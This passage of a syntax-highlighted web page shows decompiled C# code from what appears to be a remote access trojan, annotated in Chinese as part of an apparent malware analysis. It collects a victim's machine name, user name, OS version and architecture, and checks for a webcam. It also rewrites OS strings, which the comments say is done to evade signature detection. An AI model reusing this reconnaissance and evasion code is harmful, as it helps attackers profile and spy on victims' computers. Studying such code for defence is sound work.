style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Y</span><span style="--0:#666666;--1:#999999">;</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#758575DD;--1:#A0ADA0">// ========== 第二步：采集机器名（失败填??） ==========</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#4D9375;--1:#1E754F">try</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#BD976A;--1:#B07D48">infoStr</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">Environment</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">MachineName</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Y</span><span style="--0:#666666;--1:#999999">;</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#758575DD;--1:#A0ADA0">// 受害主机的计算机名（如DESKTOP-XXXX）</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#4D9375;--1:#1E754F">catch</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#5DA994;--1:#2E8F82">Exception</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">ex2</span><span style="--0:#666666;--1:#999999">)</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#BD976A;--1:#B07D48">infoStr</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">??</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Y</span><span style="--0:#666666;--1:#999999">;</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#758575DD;--1:#A0ADA0">// 采集失败填充占位符，保证数据结构完整</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#758575DD;--1:#A0ADA0">// ========== 第三步：采集当前登录用户名（失败填??） ==========</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#4D9375;--1:#1E754F">try</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#BD976A;--1:#B07D48">infoStr</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">Environment</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">UserName</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Y</span><span style="--0:#666666;--1:#999999">;</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#758575DD;--1:#A0ADA0">// 受害用户账号（如Administrator/张三）</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#4D9375;--1:#1E754F">catch</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#5DA994;--1:#2E8F82">Exception</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">ex3</span><span style="--0:#666666;--1:#999999">)</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#BD976A;--1:#B07D48">infoStr</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">??</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Y</span><span style="--0:#666666;--1:#999999">;</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#758575DD;--1:#A0ADA0">// ========== 第四步：采集恶意程序最后修改时间（失败填??-??-??） ==========</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#4D9375;--1:#1E754F">try</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#758575DD;--1:#A0ADA0">// OK.LO=恶意程序自身的FileInfo对象，采集最后修改日期（用于确认程序是否被篡改）</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#BD976A;--1:#B07D48">infoStr</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">LO</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">LastWriteTime</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Date</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">ToString</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">yy-MM-dd</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">)</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Y</span><span style="--0:#666666;--1:#999999">;</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#4D9375;--1:#1E754F">catch</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#5DA994;--1:#2E8F82">Exception</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">ex4</span><span style="--0:#666666;--1:#999999">)</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#BD976A;--1:#B07D48">infoStr</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">??-??-??</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Y</span><span style="--0:#666666;--1:#999999">;</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#BD976A;--1:#B07D48">infoStr</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">""</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Y</span><span style="--0:#666666;--1:#999999">;</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#758575DD;--1:#A0ADA0">// 填充空字段，保持分隔符结构一致</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#758575DD;--1:#A0ADA0">// ========== 第五步：采集系统版本（精简字符串，规避特征检测） ==========</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#4D9375;--1:#1E754F">try</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#758575DD;--1:#A0ADA0">// 关键操作：替换系统版本关键词，规避安全软件特征检测</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#4D9375;--1:#1E754F">string</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">osName</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">F</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Info</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">OSFullName</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Replace</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">Microsoft</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">""</span><span style="--0:#666666;--1:#999999">)</span><span style="--0:#DBD7CAEE;--1:#393A34">    </span><span style="--0:#758575DD;--1:#A0ADA0">// 移除"Microsoft"，避免特征匹配</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Replace</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">Windows</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">Win</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">)</span><span style="--0:#DBD7CAEE;--1:#393A34">   </span><span style="--0:#758575DD;--1:#A0ADA0">// 替换为Win，混淆特征</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Replace</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">®</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">""</span><span style="--0:#666666;--1:#999999">)</span><span style="--0:#DBD7CAEE;--1:#393A34">            </span><span style="--0:#758575DD;--1:#A0ADA0">// 移除版权符号</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Replace</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">™</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">""</span><span style="--0:#666666;--1:#999999">)</span><span style="--0:#DBD7CAEE;--1:#393A34">            </span><span style="--0:#758575DD;--1:#A0ADA0">// 移除商标符号</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Replace</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">  </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">)</span><span style="--0:#DBD7CAEE;--1:#393A34">          </span><span style="--0:#758575DD;--1:#A0ADA0">// 去多余空格</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Replace</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959"> Win</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">Win</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">);</span><span style="--0:#DBD7CAEE;--1:#393A34">     </span><span style="--0:#758575DD;--1:#A0ADA0">// 精简空格</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#BD976A;--1:#B07D48">infoStr</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">osName</span><span style="--0:#666666;--1:#999999">;</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#4D9375;--1:#1E754F">catch</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#5DA994;--1:#2E8F82">Exception</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">ex5</span><span style="--0:#666666;--1:#999999">)</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#BD976A;--1:#B07D48">infoStr</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">??</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">;</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#758575DD;--1:#A0ADA0">// ========== 第六步：采集系统Service Pack版本（失败填0） ==========</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#BD976A;--1:#B07D48">infoStr</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">SP</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">;</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#4D9375;--1:#1E754F">try</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#4D9375;--1:#1E754F">string</span><span style="--0:#666666;--1:#999999">[]</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">spArray</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">Strings</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Split</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">Environment</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">OSVersion</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">ServicePack</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">-</span><span style="--0:#4C9A91;--1:#2F798A">1</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">0</span><span style="--0:#666666;--1:#999999">);</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#4D9375;--1:#1E754F">if</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">spArray</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Length</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">==</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">1</span><span style="--0:#666666;--1:#999999">)</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">infoStr</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">0</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">;</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#758575DD;--1:#A0ADA0">// 无SP则填0</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#BD976A;--1:#B07D48">infoStr</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">spArray</span><span style="--0:#666666;--1:#999999">[</span><span style="--0:#BD976A;--1:#B07D48">spArray</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Length</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">-</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">1</span><span style="--0:#666666;--1:#999999">];</span><span style="--0:#DBD7CAEE;--1:#393A34">  </span><span style="--0:#758575DD;--1:#A0ADA0">// 取SP版本号（如SP1→1）</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#4D9375;--1:#1E754F">catch</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#5DA994;--1:#2E8F82">Exception</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">ex6</span><span style="--0:#666666;--1:#999999">)</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#BD976A;--1:#B07D48">infoStr</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">0</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">;</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#758575DD;--1:#A0ADA0">// ========== 第七步：采集系统位数（x86/x64，失败仅加分隔符） ==========</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#4D9375;--1:#1E754F">try</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#758575DD;--1:#A0ADA0">// Environment.SpecialFolder.ProgramFilesX86 = 38 → 该路径含x86表示64位系统</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#4D9375;--1:#1E754F">if</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">Environment</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">GetFolderPath</span><span style="--0:#666666;--1:#999999">((</span><span style="--0:#5DA994;--1:#2E8F82">Environment</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#5DA994;--1:#2E8F82">SpecialFolder</span><span style="--0:#666666;--1:#999999">)</span><span style="--0:#4C9A91;--1:#2F798A">38</span><span style="--0:#666666;--1:#999999">).</span><span style="--0:#80A665;--1:#59873A">Contains</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">x86</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">))</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#BD976A;--1:#B07D48">infoStr</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959"> x64</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Y</span><span style="--0:#666666;--1:#999999">;</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#4D9375;--1:#1E754F">else</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#BD976A;--1:#B07D48">infoStr</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959"> x86</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Y</span><span style="--0:#666666;--1:#999999">;</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#4D9375;--1:#1E754F">catch</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#5DA994;--1:#2E8F82">Exception</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">ex7</span><span style="--0:#666666;--1:#999999">)</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#BD976A;--1:#B07D48">infoStr</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Y</span><span style="--0:#666666;--1:#999999">;</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#758575DD;--1:#A0ADA0">// ========== 第八步：检测摄像头是否存在（Yes/No） ==========</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#4D9375;--1:#1E754F">if</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Cam</span><span style="--0:#666666;--1:#999999">())</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#758575DD;--1:#A0ADA0">// OK.Cam()：检测主机是否有摄像头（用于后续屏幕监控/偷拍）</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#BD976A;--1:#B07D48">infoStr</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">Yes</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Y</span><span style="--0:#666666;--1:#999999">;</span></div></div><div class="ec-line"><div 